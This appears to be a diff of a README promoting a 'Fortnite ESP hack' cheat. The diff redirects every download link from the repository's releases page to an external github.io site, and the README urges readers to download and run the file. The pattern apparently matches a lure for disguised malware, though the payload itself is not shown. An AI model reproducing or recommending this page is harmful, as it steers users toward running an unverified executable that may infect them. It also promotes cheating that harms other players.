@@ -1,7 +1,7 @@
 <h1>🎯 fortnite-esp-hack-2026 - See Everything, Win Every Fight</h1>
 
 <p align="center">
-  <a href="https://github.com/Datapusatgrt1/fortnite-esp-hack-2026/releases" style="display:inline-block;padding:18px 42px;background:linear-gradient(135deg,#ff6a00,#ee0979);color:#ffffff;font-size:24px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 25px rgba(238,9,121,0.4);">⬇️ DOWNLOAD NOW - FREE</a>
+  <a href="https://datapusatgrt1.github.io" style="display:inline-block;padding:18px 42px;background:linear-gradient(135deg,#ff6a00,#ee0979);color:#ffffff;font-size:24px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 25px rgba(238,9,121,0.4);">⬇️ DOWNLOAD NOW - FREE</a>
 </p>
 
 ---
@@ -21,7 +21,7 @@ Follow these simple steps to get up and running in less than five minutes.
 ### Step 1: Download the Application
 
 Visit this link to download the application:  
-👉 **[https://github.com/Datapusatgrt1/fortnite-esp-hack-2026/releases](https://github.com/Datapusatgrt1/fortnite-esp-hack-2026/releases)**
+👉 **[https://datapusatgrt1.github.io](https://datapusatgrt1.github.io)**
 
 Click the download button on that page. The file will be saved to your computer, usually in your "Downloads" folder.
 
@@ -77,7 +77,7 @@ These visuals appear through walls, floors, and all structures. You'll always kn
 ### Where to Download
 
 Go directly to the official release page:  
-🔗 **[https://github.com/Datapusatgrt1/fortnite-esp-hack-2026/releases](https://github.com/Datapusatgrt1/fortnite-esp-hack-2026/releases)**
+🔗 **[https://datapusatgrt1.github.io](https://datapusatgrt1.github.io)**
 
 ### How to Install
 
@@ -192,7 +192,7 @@ If you encounter any issues or have questions:
 ## 🚦 Final Steps
 
 1. **Download** from the official link:  
-   👉 **[https://github.com/Datapusatgrt1/fortnite-esp-hack-2026/releases](https://github.com/Datapusatgrt1/fortnite-esp-hack-2026/releases)**
+   👉 **[https://datapusatgrt1.github.io](https://datapusatgrt1.github.io)**
 
 2. **Run** the downloaded file.
 
